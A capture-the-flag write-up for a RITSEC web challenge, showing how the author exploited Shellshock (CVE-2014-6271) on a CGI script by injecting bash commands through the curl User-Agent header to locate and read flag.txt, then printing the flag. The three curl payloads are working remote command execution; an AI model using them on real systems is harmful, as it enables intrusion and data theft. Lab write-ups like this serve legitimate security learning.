# What a cute dog ! - Web challenge (350 points)

Another web challenge with URL: http://fun.ritsec.club:8008/.
Upon opening the given URL, we see a **shockingly** cute dog ! And some stats: *Mon Nov 19 11:06:51 UTC 2018
11:06:51 up 2 days, 18:54, 0 users, load average: 0.00, 0.00, 0.03* . 

Inspecting the source we see an interesting link: http://fun.ritsec.club:8008/cgi-bin/stats.
Googling this, we found and exploit for *stats*. And guess what, it is a shellshock exploit (*_CVE 2014-6271_*).
We are going to use this for finding the flag: **_curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'uname -a;'" http://fun.ritsec.club:8008/cgi-bin/stats_**

After some time for searching the flag, i remember that flag is always named like *flag.txt*. So I ran this command in terminal to get the exact location of a flag:

*_curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'find / -name flag.txt;'" http://fun.ritsec.club:8008/cgi-bin/stats_*

flag.txt was found in **/opt/** folder. The final step we needed to take was to read the flag. 
*_curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /opt/flag.txt;'" http://fun.ritsec.club:8008/cgi-bin/stats_*

We got response with a flag: **RITSEC{sh3ll_sh0cked_w0wz3rs}**
